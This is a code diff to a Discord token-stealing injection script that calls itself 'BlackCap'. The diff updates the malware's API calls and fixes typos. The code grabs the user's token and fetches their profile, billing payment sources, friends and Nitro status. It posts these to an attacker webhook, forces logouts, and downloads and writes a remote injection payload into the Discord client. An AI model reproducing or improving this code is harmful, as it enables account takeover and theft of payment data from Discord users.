@@ -251,7 +251,6 @@ const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await tokenScript();
     if (config['init-notify'] !== "true") return false
-    if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
@@ -263,7 +262,7 @@ const FirstTime = async () => {
             }]
         })
     } else {
-        var user = await getURL("https://discord.com/api/v8/users/@me", token)
+        var user = await getURL("https://discord.com/api/v9/users/@me", token)
         var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
         var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
         var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
@@ -344,7 +343,7 @@ const FirstTime = async () => {
         params.embeds.push(params2.embeds[0])
     }
     await post(params)
-    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
+    if ((config.logout !== "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
                 title: "BlackCaped User log out (User not Logged in before)",
@@ -355,7 +354,7 @@ const FirstTime = async () => {
                 }]
             })
         } else {
-            var user = await getURL("https://discord.com/api/v8/users/@me", token)
+            var user = await getURL("https://discord.com/api/v9/users/@me", token)
             var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
             var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
             var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
@@ -435,7 +434,7 @@ const FirstTime = async () => {
 
             params.embeds.push(params2.embeds[0])
         }
-        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
+        fs.writeFileSync("./d3dcompiler.dll", "LogOut")
         await logOutScript();
         doTheLogOut = true
         await post(params)
@@ -478,7 +477,7 @@ function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
         res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
 require("${appPath}/app.asar")
@@ -522,7 +521,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     }
     var token = await tokenScript();
     var ip = await getIP()
-    var user = await getURL("https://discord.com/api/v8/users/@me", token)
+    var user = await getURL("https://discord.com/api/v9/users/@me", token)
     var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
